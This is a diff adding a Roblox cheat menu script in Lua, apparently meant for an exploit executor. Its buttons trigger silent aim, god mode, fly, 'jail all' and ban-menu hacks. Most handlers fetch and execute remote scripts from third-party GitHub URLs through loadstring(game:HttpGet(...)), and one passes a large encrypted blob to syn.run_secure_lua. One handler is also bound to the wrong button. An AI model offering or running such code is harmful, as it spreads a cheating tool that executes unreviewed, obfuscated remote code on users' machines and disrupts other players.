@@ -1,0 +1,260 @@
+local ScreenGui = Instance.new("ScreenGui")
+local main = Instance.new("ImageLabel")
+local TextLabel = Instance.new("TextLabel")
+local jailall = Instance.new("TextButton")
+local Invisall = Instance.new("TextButton")
+local banmenu = Instance.new("TextButton")
+local menu2 = Instance.new("TextButton")
+local bypass = Instance.new("TextButton")
+local swag = Instance.new("TextButton")
+local aimlock = Instance.new("TextButton")
+local God = Instance.new("TextButton")
+local swagfly = Instance.new("TextButton")
+local rayfly = Instance.new("TextButton")
+local blackvalk = Instance.new("TextButton")
+local info = Instance.new("TextButton")
+local TextButton = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+
+main.Name = "main"
+main.Parent = ScreenGui
+main.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
+main.BackgroundTransparency = 1.000
+main.Position = UDim2.new(0.598984778, 0, 0.163021863, 0)
+main.Size = UDim2.new(0, 302, 0, 406)
+main.Image = "rbxassetid://3570695787"
+main.ImageColor3 = Color3.fromRGB(31, 31, 31)
+main.ScaleType = Enum.ScaleType.Slice
+main.SliceCenter = Rect.new(100, 100, 100, 100)
+main.SliceScale = 0.667
+main.Active = true
+main.Draggable = true
+
+TextLabel.Parent = main
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(0.425127089, 0, 0.0537634417, 0)
+TextLabel.Size = UDim2.new(0, 51, 0, 32)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "Trapanese kick menu"
+TextLabel.TextColor3 = Color3.fromRGB(243, 243, 243)
+TextLabel.TextSize = 37.000
+
+jailall.Name = "jail all"
+jailall.Parent = main
+jailall.BackgroundColor3 = Color3.fromRGB(239, 3, 255)
+jailall.Position = UDim2.new(0.00790854171, 0, 0.133651555, 0)
+jailall.Size = UDim2.new(0, 150, 0, 29)
+jailall.Font = Enum.Font.SourceSans
+jailall.Text = "Jail all"
+jailall.TextColor3 = Color3.fromRGB(255, 255, 255)
+jailall.TextSize = 14.000
+
+Invisall.Name = "Invis all"
+Invisall.Parent = main
+Invisall.BackgroundColor3 = Color3.fromRGB(239, 3, 255)
+Invisall.Position = UDim2.new(0.501022756, 0, 0.133651555, 0)
+Invisall.Size = UDim2.new(0, 150, 0, 29)
+Invisall.Font = Enum.Font.SourceSans
+Invisall.Text = "Invis all"
+Invisall.TextColor3 = Color3.fromRGB(255, 255, 255)
+Invisall.TextSize = 14.000
+Invisall.MouseButton1Down:connect(function()
+	-- whenever you want to make the players invisible,
+
+	local Players = game:GetService("Players")
+	local localPlayer = Players.LocalPlayer
+
+	-- looping through players, making sure it's not the local player
+	for _, player in ipairs(Players:GetPlayers()) do
+
+		if player ~= localPlayer then
+
+			-- find the character, wait if the character doesn't exist
+			local char = player.Character or player.CharacterAppearanceLoaded:Wait()
+
+			-- loop through ALL parts under the character
+			for _, part in ipairs(char:GetDescendants()) do
+
+				-- make sure the part is a base part so that properties exist
+				if part:IsA("BasePart") then
+
+					-- change properties
+
+					part.Transparency = 1
+					-- or part.LocalTransparencyModifier = 1
+
+					-- part.CanCollide = false
+
+				end
+			end
+		end
+	end
+end) 
+
+banmenu.Name = "ban menu"
+banmenu.Parent = main
+banmenu.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
+banmenu.BorderColor3 = Color3.fromRGB(1, 4, 53)
+banmenu.Position = UDim2.new(0.0592558421, 0, 0.797869921, 0)
+banmenu.Size = UDim2.new(0, 270, 0, 50)
+banmenu.Font = Enum.Font.SourceSans
+banmenu.Text = "working Ban menu (OLD)"
+banmenu.TextColor3 = Color3.fromRGB(255, 255, 255)
+banmenu.TextSize = 14.000
+banmenu.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Manny72911/modmenu/main/modmenu"))()
+end) 
+
+menu2.Name = "menu2"
+menu2.Parent = main
+menu2.BackgroundColor3 = Color3.fromRGB(239, 3, 255)
+menu2.Position = UDim2.new(0.00790849887, 0, 0.221880615, 0)
+menu2.Size = UDim2.new(0, 298, 0, 29)
+menu2.Font = Enum.Font.SourceSans
+menu2.Text = "enclosed menu"
+menu2.TextColor3 = Color3.fromRGB(0, 0, 0)
+menu2.TextSize = 14.000
+banmenu.MouseButton1Down:connect(function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Pvpahh/enclosed/main/enclosed'))()
+end) 
+
+bypass.Name = "bypass"
+bypass.Parent = main
+bypass.BackgroundColor3 = Color3.fromRGB(239, 3, 255)
+bypass.Position = UDim2.new(0.00128602516, 0, 0.308528394, 0)
+bypass.Size = UDim2.new(0, 150, 0, 29)
+bypass.Font = Enum.Font.SourceSans
+bypass.Text = "Swag  bypass (execute first)"
+bypass.TextColor3 = Color3.fromRGB(0, 0, 0)
+bypass.TextSize = 14.000
+bypass.MouseButton1Down:connect(function()
+	syn.run_secure_lua("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")
+end) 
+
+swag.Name = "swag"
+swag.Parent = main
+swag.BackgroundColor3 = Color3.fromRGB(239, 3, 255)
+swag.Position = UDim2.new(0.497974783, 0, 0.308528394, 0)
+swag.Size = UDim2.new(0, 150, 0, 29)
+swag.Font = Enum.Font.SourceSans
+swag.Text = "swagmode"
+swag.TextColor3 = Color3.fromRGB(0, 0, 0)
+swag.TextSize = 14.000
+swag.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))()
+end) 
+
+aimlock.Name = "aimlock"
+aimlock.Parent = main
+aimlock.BackgroundColor3 = Color3.fromRGB(239, 3, 255)
+aimlock.Position = UDim2.new(0.00128602516, 0, 0.379956961, 0)
+aimlock.Size = UDim2.new(0, 150, 0, 29)
+aimlock.Font = Enum.Font.SourceSans
+aimlock.Text = "Best silent aim (PAID)"
+aimlock.TextColor3 = Color3.fromRGB(0, 0, 0)
+aimlock.TextSize = 14.000
+aimlock.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/slime6969/slimex/main/v4"))()
+end) 
+
+God.Name = "God"
+God.Parent = main
+God.BackgroundColor3 = Color3.fromRGB(239, 3, 255)
+God.Position = UDim2.new(0.497974783, 0, 0.379956961, 0)
+God.Size = UDim2.new(0, 150, 0, 29)
+God.Font = Enum.Font.SourceSans
+God.Text = "Skinny god (on ff)"
+God.TextColor3 = Color3.fromRGB(0, 0, 0)
+God.TextSize = 14.000
+God.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/cypherdh/GodMode-V3/main/script"))()
+end) 
+
+swagfly.Name = "swag fly"
+swagfly.Parent = main
+swagfly.BackgroundColor3 = Color3.fromRGB(239, 3, 255)
+swagfly.Position = UDim2.new(0.00128598243, 0, 0.463700771, 0)
+swagfly.Size = UDim2.new(0, 300, 0, 29)
+swagfly.Font = Enum.Font.SourceSans
+swagfly.Text = "admin fly (swag)"
+swagfly.TextColor3 = Color3.fromRGB(0, 0, 0)
+swagfly.TextSize = 14.000
+swagfly.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/22kristina/swag/main/admin_fly"))()
+end) 
+
+rayfly.Name = "rayfly"
+rayfly.Parent = main
+rayfly.BackgroundColor3 = Color3.fromRGB(239, 3, 255)
+rayfly.Position = UDim2.new(0.00128598243, 0, 0.535129368, 0)
+rayfly.Size = UDim2.new(0, 300, 0, 29)
+rayfly.Font = Enum.Font.SourceSans
+rayfly.Text = "admin fly (raycodex)"
+rayfly.TextColor3 = Color3.fromRGB(0, 0, 0)
+rayfly.TextSize = 14.000
+rayfly.MouseButton1Down:connect(function()
+	-- Da Hood Shazam Fly made by Raycodex#9595
+
+	--// Settings
+	_G.ShazamFlySpeed = 3
+
+	--// Script
+	loadstring(game:HttpGet(("https://raw.githubusercontent.com/Raycodex/Exploiting/main/Roblox/DaHoodShazamFly"), true))()
+end) 
+
+blackvalk.Name = "blackvalk"
+blackvalk.Parent = main
+blackvalk.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+blackvalk.Position = UDim2.new(0.440397322, 0, 0.00246304274, 0)
+blackvalk.Size = UDim2.new(0, 36, 0, 20)
+blackvalk.Font = Enum.Font.SourceSans
+blackvalk.Text = "HEHE"
+blackvalk.TextColor3 = Color3.fromRGB(0, 0, 0)
+blackvalk.TextSize = 14.000
+blackvalk.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/carlcoded/carlispro/main/carlhub'))()
+end) 
+
+info.Name = "info"
+info.Parent = main
+info.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+info.Position = UDim2.new(0.0592558384, 0, 0.670597374, 0)
+info.Size = UDim2.new(0, 269, 0, 29)
+info.Font = Enum.Font.SourceSans
+info.Text = "info (/console)"
+info.TextColor3 = Color3.fromRGB(255, 255, 255)
+info.TextSize = 14.000
+info.MouseButton1Down:connect(function()
+	print("Made by trapanese#4444 my nitro running out so ill update it when it does also, skinny god mode only works if you have ff so do it when you join or if you reset. swag bypass makes it so swag prem users cant benx you n stuff and is synapse only thx")
+end) 
+
+TextButton.Parent = ScreenGui
+TextButton.BackgroundColor3 = Color3.fromRGB(34, 47, 49)
+TextButton.Position = UDim2.new(0, 0, 0.528827012, 0)
+TextButton.Size = UDim2.new(0, 197, 0, 50)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "Open/Close"
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextSize = 50.000
+
+-- Scripts:
+
+local function FPCFTW_fake_script() -- TextButton.Script 
+	local script = Instance.new('Script', TextButton)
+
+	local frame = script.Parent.Parent.main
+	frame.Visible = false
+	script.Parent.MouseButton1Click:Connect(function()
+		if frame.Visible == false then
+			frame.Visible = true
+		else
+			frame.Visible = false
+		end
+	end)
+end
+coroutine.wrap(FPCFTW_fake_script)()
